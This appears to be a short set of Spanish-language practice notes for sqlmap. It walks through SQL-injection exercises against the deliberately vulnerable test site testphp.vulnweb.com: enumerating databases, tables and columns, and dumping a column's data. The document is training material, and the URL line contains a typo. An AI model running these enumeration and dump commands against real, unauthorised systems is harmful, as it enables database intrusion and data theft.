++ Sitio vulnerable: http://testphp.vulnweb.com/
--- url (específico): sqlmap -u test.php.vulnweb.com/artists.php?artist= 1

++ Ejercicio_1 Obtener el nombre de las bases de datos
--- sqlmap -u <url> --dbs
--- y
--- Enter 
--- Aparecerán un listado de las bases de datos disponibles

++ Ejercicio_2 Obtener las tablas que conformarn la base de datos
--- sqlmap -u <url> -D <nombre_base_de_datos> --tables
--- Se mostrará un listado de las tablas que conforman la base de datos

++ Ejercicio_3 Obtener el número y la descripción de las columnas de una tabla
--- sqlmap -u <url> -D <nombre_base_de_datos> -T <nombre_tabla> --columns

++ Ejercicio_4 Obtener la información de una columna
--- sqlmap -u <url> -D <nombre_base_de_datos> -T <nombre_tabla> -C <nombre_columna> --dump 

++ Nota: Es importante destacar que tras cada consulta esta información se guarda en un arhcivo .csv dentro de la carpeta .sqlmap (carpeta oculta)
